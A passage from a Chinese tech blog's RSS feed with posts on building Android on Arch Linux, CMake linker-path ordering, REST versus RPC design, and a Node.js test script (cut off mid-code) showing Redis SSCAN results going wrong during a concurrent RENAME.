<li><a href="https://software.intel.com/en-us/articles/building-an-android-command-line-application-using-the-ndk-build-tools">Building an Android* Command-Line Application Using the NDK Build Tools | Intel® Software</a></li>

<li><a href="https://www.jianshu.com/p/6332418b12b1">Android NDK开发扫盲及最新CMake的编译使用 - 简书</a></li>

<li><a href="https://blog.csdn.net/minghuang2017/article/details/78938852">在命令行下用cmake交叉编译可在android中运行的so包 - CSDN博客</a></li>

<li><a href="https://blog.csdn.net/minghuang2017/article/details/79000345">cmake使用独立工具链交叉编译可在android中运行的so包 - CSDN博客</a></li>

<li><a href="https://warpedtimes.wordpress.com/2010/02/03/building-open-source-libraries-with-android-ndk/">Building Open Source libraries with Android NDK | Thoughts and Ideas In Warped Times</a></li>

<li><a href="https://zhangtom.com/2017/07/11/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B8%A6RTMP%E6%A8%A1%E5%9D%97%E7%9A%84Nginx%E5%88%B0Android/">交叉编译带RTMP模块的Nginx到Android | Tom's Blog</a></li>

<li><a href="https://stackoverflow.com/questions/10380422/android-static-linking-vs-dynamic-linking-against-glibc">Android Static Linking vs Dynamic Linking against glibc - Stack Overflow</a></li>

<li><a href="https://stackoverflow.com/questions/27082959/gcc-static-and-pie-are-incompatible-for-x86">android 5.0 lollipop - GCC: -static and -pie are incompatible for x86? - Stack Overflow</a></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Archlinux 下编译 Android]]></title>
            <link>/article/archlinux-4e0b7f168bd1-android.html</link>
            <guid>/article/archlinux-4e0b7f168bd1-android.html</guid>
            <pubDate>Thu, 09 Aug 2018 07:26:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org70f5afe" class="outline-2">
<h2 id="org70f5afe">安装 openjdk</h2>
<div class="outline-text-2" id="text-org70f5afe">
<p>
根据 Android 版本选择 <code>openjdk</code> 版本进行安装
</p>

<div class="org-src-container">
<pre class="src src-sh">yaourt -S jdk8-openjdk
</pre>
</div>

<ul class="org-ul">
<li>参考 <a href="https://wiki.archlinux.org/index.php/Android#Java_Development_Kit">Java_Development_Kit - Android - ArchWiki</a></li>
</ul>
</div>
</div>

<div id="outline-container-org29ed34e" class="outline-2">
<h2 id="org29ed34e">安装 repo</h2>
<div class="outline-text-2" id="text-org29ed34e">
<p>
<a href="https://android.googlesource.com/tools/repo">repo</a> 是用来从多个 <code>Git</code> 仓库构建 <code>Android</code> 的工具。
</p>

<div class="org-src-container">
<pre class="src src-sh">curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/repo
chmod a+x ~/repo
sudo mv ~/repo /usr/local/bin/
</pre>
</div>

<p>
参考 <a href="https://source.android.com/setup/build/downloading#installing-repo">Downloading the Source  |  Android Open Source Project</a>
</p>
</div>
</div>

<div id="outline-container-org5ac6513" class="outline-2">
<h2 id="org5ac6513">设置编译环境</h2>
<div class="outline-text-2" id="text-org5ac6513">
<div class="org-src-container">
<pre class="src src-sh">mkdir -p ~/Opensource/android
<span style="color: #b294bb;">cd</span> ~/Opensource/android
virtualenv2 venv
<span style="color: #b294bb;">source</span> venv/bin/activate
</pre>
</div>

<ul class="org-ul">
<li>参考 <a href="https://wiki.archlinux.org/index.php/Android#Setting_up_the_build_environment">Setting up the build environment - Android - ArchWiki</a></li>
</ul>
</div>
</div>

<div id="outline-container-orgf11f512" class="outline-2">
<h2 id="orgf11f512">下载源代码</h2>
<div class="outline-text-2" id="text-orgf11f512">
<div class="org-src-container">
<pre class="src src-sh">repo init -u https://android.googlesource.com/platform/manifest -b master
repo sync -j4
</pre>
</div>

<p>
以后如果要同步最新代码，则执行
</p>

<div class="org-src-container">
<pre class="src src-sh">repo sync
</pre>
</div>

<p>
下载过程中可能被墙导致失败，可以考虑使用 <code>proxychains</code> 来翻墙，最好还是国内找一
个镜像，加快下载速度。
</p>

<p>
代码有几十个 G，下载和编译都需要很长时间。
</p>

<ul class="org-ul">
<li>参考 <a href="https://wiki.archlinux.org/index.php/Android#Downloading%20the%20source%20code">Downloading the source code - Android - ArchWiki</a></li>
</ul>
</div>
</div>

<div id="outline-container-org7e227b7" class="outline-2">
<h2 id="org7e227b7">编译</h2>
<div class="outline-text-2" id="text-org7e227b7">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">source</span> build/envsetup.sh
lunch full-eng
make -j4
</pre>
</div>
</div>
</div>

<div id="outline-container-org0b48786" class="outline-2">
<h2 id="org0b48786">测试</h2>
<div class="outline-text-2" id="text-org0b48786">
<div class="org-src-container">
<pre class="src src-sh">emulator
</pre>
</div>
</div>
</div>

<div id="outline-container-orgbf5b892" class="outline-2">
<h2 id="orgbf5b892">参考</h2>
<div class="outline-text-2" id="text-orgbf5b892">
<ul class="org-ul">
<li><a href="https://wiki.archlinux.org/index.php/Android#Building">Building - Android - ArchWiki</a></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[CMakeLists.txt 如何控制库路径的顺序]]></title>
            <link>/article/cmakelists.txt-59824f5563a752365e938def5f847684987a5e8f.html</link>
            <guid>/article/cmakelists.txt-59824f5563a752365e938def5f847684987a5e8f.html</guid>
            <pubDate>Thu, 12 Jul 2018 10:10:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
一般来说，系统默认的配置会放在 <code>LDFLAGS</code> 环境变量中，用于指定默认的库查找路径，
有一些子项目会使用自已附带的最新版或定制版第三方库，会希望将自已附带的库路径放到
最前面。
</p>

<p>
<code>LDFLAGS</code> 环境变量指定了库查找路径 A <code>-L/opt/a/lib</code> ， <code>CMakeLists.txt</code> 指定了库
查找路径 B <code>link_directories(/opt/b/lib)</code> ，实际上 A 总是会位于 B 之前，这是因为
CMake 并没有解析 <code>LDFLAGS</code> 中的 <code>-L</code> 选项。
</p>

<p>
相关讨论 <a href="https://cmake.org/pipermail/cmake/2007-November/017479.html">{CMake} Link directories order</a>
</p>

<p>
当对库查找路径的顺序有要求时，不应该使用 <code>link_directories</code> 选项来指定库查找路径，
而是使用 <code>CMAKE_*_LINKER_FLAGS</code> ，如
</p>

<div class="org-src-container">
<pre class="src src-cmake"><span style="color: #de935f;">set</span>(CMAKE_EXE_LINKER_FLAGS <span style="color: #8abeb7;">"-L/opt/b/lib ${</span><span style="color: #f0c674;">CMAKE_EXE_LINKER_FLAGS</span><span style="color: #8abeb7;">}"</span>)
</pre>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[关于 REST 与 RPC 的一些思索]]></title>
            <link>/article/51734e8e-rest-4e0e-rpc-76844e004e9b601d7d22.html</link>
            <guid>/article/51734e8e-rest-4e0e-rpc-76844e004e9b601d7d22.html</guid>
            <pubDate>Sun, 11 Feb 2018 09:52:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在工作过程中不同程度地使用过 REST 和 RPC 来设计系统，对于使用过程中的优劣有一
定的了解。 
</p>

<div id="outline-container-orge903006" class="outline-2">
<h2 id="orge903006">RPC 的使用感受</h2>
<div class="outline-text-2" id="text-orge903006">
<p>
面向过程，就像是使用 <code>C</code> 语言也可以面向对象一样，精心设计一下 RPC 接口也可以有面
向对象一样的体验。RPC 与程序员的思维非常接近，函数与 RPC 接口进行了精确的映射，
有很多的工具或库能够自动将函数暴露为可远程进行调用的 RPC 接口，能够立即上手进行
开发。容易产生细粒度的接口，大量的业务逻辑以及决策由客户端实现。
</p>

<p>
RPC 对传输、编解码进行了严格的定义，只要定义好接口，就可以藉由工具进行代码生成，
使得开发人员只需要专注于业务逻辑开发。由于 RPC 没有对应用语义做任何定义，每个人
设计的 RPC 接口差别会很大，需要客户端和服务器端紧密协作来完成开发。
</p>
</div>
</div>

<div id="outline-container-orga07aa1f" class="outline-2">
<h2 id="orga07aa1f">REST 的使用感受</h2>
<div class="outline-text-2" id="text-orga07aa1f">
<p>
面向对象（资源），需预先按资源进行建模，有一些东西天生就不是面向资源的，比如：搜
索、登录，则需要自由发挥，容易出现牵强的资源抽象。开发的前期会有明显的设计阶段。
容易产生粗粒度的接口，大量的业务逻辑以及决策由服务端实现。
</p>

<p>
REST 没有对传输、编解码进行严格的定义，定义好资源后，需要手工进行编解码、HTTP
框架代码开发。由于 REST 对应用语义做了大量的定义，每个人设计的接口都是相似的，
基于被广泛认可的设计规约，客户端和服务器端不容易产生大的分歧。
</p>
</div>
</div>

<div id="outline-container-org9013ad0" class="outline-2">
<h2 id="org9013ad0">REST 是诗和远方</h2>
<div class="outline-text-2" id="text-org9013ad0">
<p>
适用于开发 Internet 级别的应用。
</p>

<p>
也就是说服务的使用者遍布世界各地，服务可能会以意想不到的方式被访问。服务提供者
（Server 端）与服务的使用者（Client 端）是不同的组织，以松耦合（loose coupling）
的方式互相协作。
</p>

<p>
虽然存在大量被广泛接受的最佳实践，但并不存在官方的 REST 实现。不具体也就意味着开
发者需要做很多的决定，比如需自行设计 URL、Content-Type、Encoding/Decoding 等。
</p>
</div>
</div>

<div id="outline-container-orgfa503f1" class="outline-2">
<h2 id="orgfa503f1">RPC 是眼前的苟且</h2>
<div class="outline-text-2" id="text-orgfa503f1">
<p>
适用于开发 Intranet 级别的应用。
</p>

<p>
定下协议，生成框架代码，分别开发完应用模块，联调通过，上线，收工。
</p>
</div>
</div>

<div id="outline-container-orgd18c833" class="outline-2">
<h2 id="orgd18c833">为什么要使用 REST</h2>
<div class="outline-text-2" id="text-orgd18c833">
<ul class="org-ul">
<li>将控制权放在服务端</li>
</ul>

<p>
业务流程是由服务器控制的，客户端不需要完整理解业务逻辑。
</p>

<ul class="org-ul">
<li>通用的心理模型</li>
</ul>

<p>
如 HTTP 方法隐含的 <code>冥等性</code> 意义，通过 URL、Resource 展示出的业务模型（Model）。
</p>

<ul class="org-ul">
<li>重用基础设施</li>
</ul>

<p>
如 Nginx Proxy、Cache
</p>
</div>
</div>

<div id="outline-container-orgadf91e8" class="outline-2">
<h2 id="orgadf91e8">什么时候不需要使用 REST</h2>
<div class="outline-text-2" id="text-orgadf91e8">
<ul class="org-ul">
<li>内部系统</li>
</ul>

<p>
Server 和 Client 是由同一个组织、团队进行开发。使用 gRPC 之类的技术可以获得更高
的开发效率。
</p>

<ul class="org-ul">
<li>业务逻辑比较简单或者已经固化</li>
</ul>

<p>
REST 带来的弹性、扩展性并非刚需。
</p>

<ul class="org-ul">
<li>客户端与服务器之前的交互不是“请求－响应”模型</li>
</ul>

<p>
服务器需要通知客户端
</p>
</div>
</div>

<div id="outline-container-org8ac8bc4" class="outline-2">
<h2 id="org8ac8bc4">结语</h2>
<div class="outline-text-2" id="text-org8ac8bc4">
<p>
采用 REST 还是 RPC 对系统的根本复杂性影响较小，更多的是开发过程中会有不同的体验。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Scan 时进行 Rename 导致结果未定义]]></title>
            <link>/article/scan-65f68fdb884c-rename-5bfc81f47ed3679c672a5b9a4e49.html</link>
            <guid>/article/scan-65f68fdb884c-rename-5bfc81f47ed3679c672a5b9a4e49.html</guid>
            <pubDate>Thu, 18 Jan 2018 12:16:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
我们有一个服务有这种场景：
</p>

<ul class="org-ul">
<li>Web 服务提供查询接口返回一个很大的数据集给客户端</li>
</ul>

<p>
这个数据集使用 <code>Sets</code> 结构进行保存，读取这个数据集使用 <code>sscan</code> 命令每次返回
<code>100</code> 条记录，直到读完为止。
</p>

<ul class="org-ul">
<li>后台计算脚本计算并更新数据集</li>
</ul>

<p>
计算结果先放到一个临时 <code>key</code> 中，等到计算完再通过 <code>rename</code> 覆盖正式的 <code>key</code> 。
</p>

<p>
最近，客户方反映获取的数据集偏小，正常应该是 20 多万条记录，结果只取到几万条记录。
</p>

<p>
我们怀疑是 Scan 过程中如果数据集被 <code>rename</code> 覆盖，结果可能是未定义的，见以下测试程序：
</p>

<p>
<code>redis_rename_when_scan.js</code>
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #8abeb7;">"use strict"</span>;

<span style="color: #b5bd68;">const</span> <span style="color: #f0c674;">Redis</span> = require(<span style="color: #8abeb7;">'ioredis'</span>);
<span style="color: #b5bd68;">const</span> <span style="color: #b5bd68;">async</span> = require(<span style="color: #8abeb7;">'async'</span>);
<span style="color: #b5bd68;">const</span> <span style="color: #f0c674;">_</span> = require(<span style="color: #8abeb7;">'lodash'</span>);
<span style="color: #b5bd68;">const</span> <span style="color: #f0c674;">crypto</span> = require(<span style="color: #8abeb7;">'crypto'</span>);

<span style="color: #b5bd68;">const</span> <span style="color: #f0c674;">key_</span> = <span style="color: #8abeb7;">"test:set_"</span>;
<span style="color: #b5bd68;">const</span> <span style="color: #f0c674;">key</span> = <span style="color: #8abeb7;">"test:set"</span>;
<span style="color: #b5bd68;">const</span> <span style="color: #f0c674;">min</span> = 0;
<span style="color: #b5bd68;">const</span> <span style="color: #f0c674;">max</span> = 100000;
<span style="color: #b5bd68;">const</span> <span style="color: #f0c674;">prefix_length</span> = 20;
<span style="color: #b5bd68;">let</span> <span style="color: #f0c674;">scan_round</span> = 0;
<span style="color: #b5bd68;">let</span> <span style="color: #f0c674;">write_round</span> = 0;

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">add</span>(<span style="color: #f0c674;">client</span>, <span style="color: #f0c674;">value</span>, <span style="color: #f0c674;">callback</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (value &gt; max) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> callback(<span style="color: #81a2be;">null</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   crypto.randomBytes(parseInt(prefix_length / 2, 10), <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">err</span>, <span style="color: #f0c674;">buffer</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> callback(err);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">Test full random dataset</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">let prefix = buffer.toString('hex');</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">Test fixed dataset</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">let prefix = _.pad('', prefix_length, '0');</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">Test partial random dataset</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">let</span> <span style="color: #f0c674;">prefix</span> = _.pad(<span style="color: #8abeb7;">''</span>, prefix_length - 1, <span style="color: #8abeb7;">'0'</span>) + buffer.toString(<span style="color: #8abeb7;">'hex'</span>)[<span style="text-decoration: underline;">0];</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> client.sadd(key_, prefix + value, <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">err</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> callback(err);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   value += 1;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> add(client, value, callback);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">write</span>(<span style="color: #f0c674;">client</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (!client) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Redis</span>();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.del(key_, <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">err</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">throw</span> err;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   add(client, min, <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">err</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">throw</span> err;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.rename(key_, key, <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">err</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">throw</span> err;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(<span style="color: #8abeb7;">"write#"</span> + write_round + <span style="color: #8abeb7;">" DONE"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   ++write_round;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   write(client);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">ready</span>(<span style="color: #f0c674;">client</span>, <span style="color: #f0c674;">callback</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (!client) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Redis</span>();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.exists(key, <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">err</span>, <span style="color: #f0c674;">exists</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   callback(err);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   } <span style="color: #b5bd68;">else</span> <span style="color: #b5bd68;">if</span> (exists) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   callback(<span style="color: #81a2be;">null</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   setTimeout(<span style="color: #b5bd68;">function</span>() {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   ready(client, callback);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }, 100);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">init</span>(<span style="color: #f0c674;">callback</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">let</span> <span style="color: #f0c674;">client</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Redis</span>();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.del(key_, <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">err</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">throw</span> err;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.del(key, <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">err</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">throw</span> err;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   callback();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">scan</span>(<span style="color: #f0c674;">client</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (!client) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Redis</span>();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   ready(<span style="color: #81a2be;">null</span>, <span style="color: #b5bd68;">function</span>() {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">let</span> <span style="color: #f0c674;">results</span> = [];
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">cursor</span> = 0;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">async</span>.doWhilst(<span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">done</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.sscan(key, cursor, <span style="color: #8abeb7;">'COUNT'</span>, 100, <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">err</span>, <span style="color: #f0c674;">values</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">throw</span> err;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   cursor = +values[0];

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   values[1].forEach(<span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">value</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   results.push(value);
